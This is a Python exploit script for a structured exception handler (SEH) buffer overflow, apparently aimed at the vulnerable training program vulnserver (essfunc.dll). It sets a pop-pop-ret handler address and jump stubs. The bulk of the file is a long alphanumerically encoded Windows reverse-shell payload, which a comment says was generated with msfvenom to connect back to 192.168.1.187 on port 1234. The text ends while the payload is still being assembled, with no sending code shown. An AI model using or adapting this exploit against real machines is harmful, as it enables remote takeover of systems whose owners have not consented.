#!/usr/bin/python

import socket
import os
import sys


print "Useage: python exploit.py host port"


host = sys.argv[1]
port = int(sys.argv[2])

#seh= "0x6250172b : pop edi # pop ebp # ret  | asciiprint,ascii {PAGE_EXECUTE_READ} [essfunc.dll]"
seh="\x2b\x17\x50\x62"

nseh="\x74\x06\x75\x04"
#------------------------------------------------------
#fistespadj="push esp;pop eax;add ax,0x116d;add al,0x7f;push eax;pop esp"
firstespadj="\x54\x58\x66\x05\x6D\x11\x04\x7f\x50\x5c"

#firstshortjump = "\xeb\x80\x90\x90" in alphanumeric using Slink.py
firstshortjump = "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
firstshortjump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
firstshortjump += "\x05\x76\x40\x50\x50" ## add  eax, 0x50504076
firstshortjump += "\x05\x75\x40\x40\x40" ## add  eax, 0x40404075
firstshortjump += "\x50"                 ## push eax
#--------------------------------------------------------------
#secondespadj= "push esp;pop eax;sub al,0x3A;push eax;pop esp"
secondespadj="\x54\x58\x2c\x3a\x50\x5c"

#secondlongjump ="push esp;pop ebx;sub bx,0xDBA;call ebx" in alphanumeric using Slink.py
#secondlongjump ="\x54\x5b\x66\x81\xEB\xBA\x0D\xff\xd3"
secondlongjump="\x54\x5b"
secondlongjump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
secondlongjump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
secondlongjump += "\x05\x16\x77\x62\x41" ## add  eax, 0x41627716
secondlongjump += "\x05\x16\x66\x62\x41" ## add  eax, 0x41626616
secondlongjump += "\x05\x14\x55\x42\x41" ## add  eax, 0x41425514
secondlongjump += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
secondlongjump += "\x50"                 ## push eax
secondlongjump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
secondlongjump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
secondlongjump += "\x05\x33\x41\x76\x65" ## add  eax, 0x65764133
secondlongjump += "\x05\x33\x40\x75\x55" ## add  eax, 0x55754033
secondlongjump += "\x50"                 ## push eax
#--------------------------------------------------------------
#thirdespadj = "push esp;pop eax;sub al,0x47;push eax;pop esp"
thirdespadj="\x54\x58\x2c\x47\x50\x5c"

#shellcode = msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.187 LPORT=1234 -f c -b '\x00' -a x86 BufferRegister=ESP
#shellcode than passed to Slink.py

shellcode = "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x76\x72\x50\x50" ## add  eax, 0x50507276
shellcode += "\x05\x66\x72\x40\x40" ## add  eax, 0x40407266
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x76\x56\x35\x51" ## add  eax, 0x51355676
shellcode += "\x05\x65\x56\x35\x41" ## add  eax, 0x41355665
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x21\x25\x22\x27" ## add  eax, 0x27222521
shellcode += "\x05\x21\x14\x22\x16" ## add  eax, 0x16221421
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x03\x37\x53\x26" ## add  eax, 0x26533703
shellcode += "\x05\x03\x46\x44\x26" ## add  eax, 0x26444603
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x71\x36\x62\x34" ## add  eax, 0x34623671
shellcode += "\x05\x62\x36\x61\x24" ## add  eax, 0x24613662
shellcode += "\x05\x51\x24\x42\x24" ## add  eax, 0x24422451
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x62\x77\x73\x61" ## add  eax, 0x61737762
shellcode += "\x05\x62\x66\x63\x50" ## add  eax, 0x50636662
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x44\x66\x76\x42" ## add  eax, 0x42766644
shellcode += "\x05\x44\x66\x65\x31" ## add  eax, 0x31656644
shellcode += "\x05\x44\x44\x53\x32" ## add  eax, 0x32534444
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x71\x42\x36\x26" ## add  eax, 0x26364271
shellcode += "\x05\x61\x32\x35\x15" ## add  eax, 0x15353261
shellcode += "\x05\x51\x32\x36\x26" ## add  eax, 0x26363251
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x60\x25\x11\x03" ## add  eax, 0x03112560
shellcode += "\x05\x60\x14\x11\x04" ## add  eax, 0x04111460
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x31\x63\x74\x42" ## add  eax, 0x42746331
shellcode += "\x05\x31\x53\x63\x41" ## add  eax, 0x41635331
shellcode += "\x05\x21\x33\x53\x32" ## add  eax, 0x32533321
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x62\x21\x47\x37" ## add  eax, 0x37472162
shellcode += "\x05\x52\x10\x47\x27" ## add  eax, 0x27471052
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x75\x33\x31\x31" ## add  eax, 0x31313375
shellcode += "\x05\x64\x34\x40\x20" ## add  eax, 0x20403464
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x72\x41\x46\x67" ## add  eax, 0x67464172
shellcode += "\x05\x62\x42\x46\x66" ## add  eax, 0x66464262
shellcode += "\x05\x52\x41\x34\x45" ## add  eax, 0x45344152
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x67\x11\x66\x67" ## add  eax, 0x67661167
shellcode += "\x05\x56\x12\x55\x66" ## add  eax, 0x66551256
shellcode += "\x05\x35\x11\x43\x45" ## add  eax, 0x45431135
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x60\x23\x16\x03" ## add  eax, 0x03162360
shellcode += "\x05\x60\x24\x05\x03" ## add  eax, 0x03052460
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x34\x63\x51\x37" ## add  eax, 0x37516334
shellcode += "\x05\x34\x53\x42\x26" ## add  eax, 0x26425334
shellcode += "\x05\x34\x62\x41\x25" ## add  eax, 0x25416234
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x26\x26\x74\x64" ## add  eax, 0x64742626
shellcode += "\x05\x25\x15\x63\x54" ## add  eax, 0x54631525
shellcode += "\x05\x26\x23\x53\x64" ## add  eax, 0x64532326
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x67\x37\x42\x23" ## add  eax, 0x23423767
shellcode += "\x05\x57\x37\x41\x12" ## add  eax, 0x12413757
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x41\x24\x52\x76" ## add  eax, 0x76522441
shellcode += "\x05\x41\x24\x41\x75" ## add  eax, 0x75412441
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x21\x23\x05\x33" ## add  eax, 0x33052321
shellcode += "\x05\x10\x22\x05\x33" ## add  eax, 0x33052210
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x53\x37\x47\x65" ## add  eax, 0x65473753
shellcode += "\x05\x54\x46\x47\x54" ## add  eax, 0x54474654
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x76\x62\x34\x21" ## add  eax, 0x21346276
shellcode += "\x05\x66\x52\x34\x11" ## add  eax, 0x11345266
shellcode += "\x05\x54\x42\x33\x21" ## add  eax, 0x21334254
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x15\x45\x76\x46" ## add  eax, 0x46764515
shellcode += "\x05\x14\x44\x65\x46" ## add  eax, 0x46654414
shellcode += "\x05\x14\x34\x54\x34" ## add  eax, 0x34543414
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x13\x17\x56\x74" ## add  eax, 0x74561713
shellcode += "\x05\x03\x06\x55\x64" ## add  eax, 0x64550603
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x42\x33\x16\x47" ## add  eax, 0x47163342
shellcode += "\x05\x41\x43\x15\x46" ## add  eax, 0x46154341
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x36\x34\x02\x61" ## add  eax, 0x61023436
shellcode += "\x05\x46\x24\x01\x60" ## add  eax, 0x60012446
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x46\x07\x35\x23" ## add  eax, 0x23350746
shellcode += "\x05\x45\x06\x24\x23" ## add  eax, 0x23240645
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x36\x30\x25\x51" ## add  eax, 0x51253036
shellcode += "\x05\x45\x30\x24\x40" ## add  eax, 0x40243045
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x71\x32\x63\x67" ## add  eax, 0x67633271
shellcode += "\x05\x61\x22\x52\x66" ## add  eax, 0x66522261
shellcode += "\x05\x51\x22\x32\x45" ## add  eax, 0x45322251
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x67\x33\x64\x66" ## add  eax, 0x66643367
shellcode += "\x05\x56\x33\x54\x65" ## add  eax, 0x65543356
shellcode += "\x05\x65\x22\x44\x44" ## add  eax, 0x44442265
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x33\x66\x21\x27" ## add  eax, 0x27216633
shellcode += "\x05\x42\x66\x10\x16" ## add  eax, 0x16106642
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x21\x55\x33\x40" ## add  eax, 0x40335521
shellcode += "\x05\x20\x44\x33\x40" ## add  eax, 0x40334420
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x22\x06\x40\x71" ## add  eax, 0x71400622
shellcode += "\x05\x21\x06\x40\x71" ## add  eax, 0x71400621
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x55\x67\x37\x50" ## add  eax, 0x50376755
shellcode += "\x05\x55\x66\x47\x40" ## add  eax, 0x40476655
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x33\x41\x47\x56" ## add  eax, 0x56474133
shellcode += "\x05\x23\x41\x36\x45" ## add  eax, 0x45364123
shellcode += "\x05\x22\x41\x35\x43" ## add  eax, 0x43354122
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x26\x74\x43\x24" ## add  eax, 0x24437426
shellcode += "\x05\x15\x64\x42\x24" ## add  eax, 0x24426415
shellcode += "\x05\x24\x54\x32\x23" ## add  eax, 0x23325424
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x72\x64\x46\x62" ## add  eax, 0x62466472
shellcode += "\x05\x62\x64\x35\x61" ## add  eax, 0x61356462
shellcode += "\x05\x52\x44\x33\x42" ## add  eax, 0x42334452
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x12\x21\x11\x66" ## add  eax, 0x66112112
shellcode += "\x05\x12\x22\x22\x66" ## add  eax, 0x66222212
shellcode += "\x05\x12\x21\x11\x44" ## add  eax, 0x44112112
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x54\x30\x51\x16" ## add  eax, 0x16513054
shellcode += "\x05\x54\x40\x50\x06" ## add  eax, 0x06504054
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x46\x67\x71\x62" ## add  eax, 0x62716746
shellcode += "\x05\x36\x66\x62\x51" ## add  eax, 0x51626636
shellcode += "\x05\x34\x45\x51\x32" ## add  eax, 0x32514534
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x76\x23\x61\x16" ## add  eax, 0x16612376
shellcode += "\x05\x65\x22\x52\x16" ## add  eax, 0x16522265
shellcode += "\x05\x54\x22\x61\x14" ## add  eax, 0x14612254
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x54\x32\x25\x52" ## add  eax, 0x52253254
shellcode += "\x05\x54\x32\x24\x52" ## add  eax, 0x52243254
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x14\x12\x31\x37" ## add  eax, 0x37311214
shellcode += "\x05\x13\x22\x21\x36" ## add  eax, 0x36212213
shellcode += "\x05\x13\x12\x21\x25" ## add  eax, 0x25211213
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x16\x52\x67\x50" ## add  eax, 0x50675216
shellcode += "\x05\x16\x51\x67\x50" ## add  eax, 0x50675116
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x53\x33\x14\x37" ## add  eax, 0x37143353
shellcode += "\x05\x42\x32\x14\x36" ## add  eax, 0x36143242
shellcode += "\x05\x42\x32\x14\x25" ## add  eax, 0x25143242
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x76\x66\x46\x62" ## add  eax, 0x62466676
shellcode += "\x05\x65\x55\x46\x61" ## add  eax, 0x61465565
shellcode += "\x05\x53\x46\x44\x42" ## add  eax, 0x42444653
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x32\x63\x77\x70" ## add  eax, 0x70776332
shellcode += "\x05\x21\x52\x77\x70" ## add  eax, 0x70775221
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x46\x43\x66\x11" ## add  eax, 0x11664346
shellcode += "\x05\x45\x32\x55\x21" ## add  eax, 0x21553245
shellcode += "\x05\x46\x32\x44\x11" ## add  eax, 0x11443246
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x25\x63\x47\x32" ## add  eax, 0x32476325
shellcode += "\x05\x24\x62\x46\x42" ## add  eax, 0x42466224
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x53\x30\x63\x35" ## add  eax, 0x35633053
shellcode += "\x05\x42\x30\x63\x24" ## add  eax, 0x24633042
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x22\x37\x43\x71" ## add  eax, 0x71433722
shellcode += "\x05\x21\x36\x42\x62" ## add  eax, 0x62423621
shellcode += "\x05\x22\x25\x42\x51" ## add  eax, 0x51422522
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x30\x27\x47\x06" ## add  eax, 0x06472730
shellcode += "\x05\x30\x17\x46\x05" ## add  eax, 0x05461730
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x12\x14\x14\x37" ## add  eax, 0x37141412
shellcode += "\x05\x21\x24\x14\x26" ## add  eax, 0x26142421
shellcode += "\x05\x12\x14\x14\x25" ## add  eax, 0x25141412
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x55\x53\x63\x63" ## add  eax, 0x63635355
shellcode += "\x05\x44\x43\x62\x63" ## add  eax, 0x63624344
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x03\x21\x57\x65" ## add  eax, 0x65572103
shellcode += "\x05\x03\x10\x57\x54" ## add  eax, 0x54571003
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x55\x23\x70\x53" ## add  eax, 0x53702355
shellcode += "\x05\x54\x12\x70\x42" ## add  eax, 0x42701254
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x32\x51\x32\x55" ## add  eax, 0x55325132
shellcode += "\x05\x32\x51\x31\x44" ## add  eax, 0x44315132
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x66\x71\x44\x34" ## add  eax, 0x34447166
shellcode += "\x05\x55\x61\x43\x33" ## add  eax, 0x33436155
shellcode += "\x05\x66\x51\x33\x33" ## add  eax, 0x33335166
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x21\x43\x12\x67" ## add  eax, 0x67124321
shellcode += "\x05\x21\x33\x22\x56" ## add  eax, 0x56223321
shellcode += "\x05\x21\x32\x12\x35" ## add  eax, 0x35123221
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x47\x31\x62\x67" ## add  eax, 0x67623147
shellcode += "\x05\x46\x31\x62\x56" ## add  eax, 0x56623146
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x31\x13\x56\x67" ## add  eax, 0x67561331
shellcode += "\x05\x21\x04\x56\x56" ## add  eax, 0x56560421
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x47\x63\x36\x45" ## add  eax, 0x45366347
shellcode += "\x05\x46\x53\x35\x34" ## add  eax, 0x34355346
shellcode += "\x05\x45\x42\x33\x34" ## add  eax, 0x34334245
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x37\x33\x01\x61" ## add  eax, 0x61013337
shellcode += "\x05\x27\x33\x01\x51" ## add  eax, 0x51013327
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x50\x33\x61\x36" ## add  eax, 0x36613350
shellcode += "\x05\x50\x24\x61\x45" ## add  eax, 0x45612450
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x43\x46\x24\x47" ## add  eax, 0x47244643
shellcode += "\x05\x43\x45\x14\x46" ## add  eax, 0x46144543
shellcode += "\x05\x32\x44\x24\x35" ## add  eax, 0x35244432
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x76\x52\x21\x25" ## add  eax, 0x25215276
shellcode += "\x05\x76\x42\x10\x25" ## add  eax, 0x25104276
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x61\x21\x47\x43" ## add  eax, 0x43472161
shellcode += "\x05\x51\x11\x47\x43" ## add  eax, 0x43471151
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x62\x12\x17\x46" ## add  eax, 0x46171262
shellcode += "\x05\x52\x22\x26\x45" ## add  eax, 0x45262252
shellcode += "\x05\x32\x12\x15\x34" ## add  eax, 0x34151232
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
